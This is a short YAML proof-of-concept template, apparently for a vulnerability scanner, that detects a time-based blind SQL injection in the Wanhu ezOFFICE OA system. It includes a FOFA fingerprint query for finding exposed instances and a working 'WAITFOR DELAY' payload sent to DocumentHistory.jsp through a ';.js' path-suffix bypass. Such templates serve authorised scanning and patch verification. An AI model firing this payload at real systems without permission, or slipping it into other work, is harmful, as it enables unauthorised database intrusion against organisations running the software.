id: poc-yaml-whir-ezoffice-documenthistory-sqli
info:
  name: 万户 ezOFFICE DocumentHistory SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 万户OA ezoffice
  fofa: app="万户网络-ezOFFICE"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /
  expression: status_code == 302 && contains(headers,"/defaultroot")
- method: GET
  path: /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1%27%20WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
  expression: status_code == 200 && contains(body,"iSignature") && contains(body,"??????")
    && contains(body,"TDTitleStyle") && duration > t1 && duration < t2
transport: http
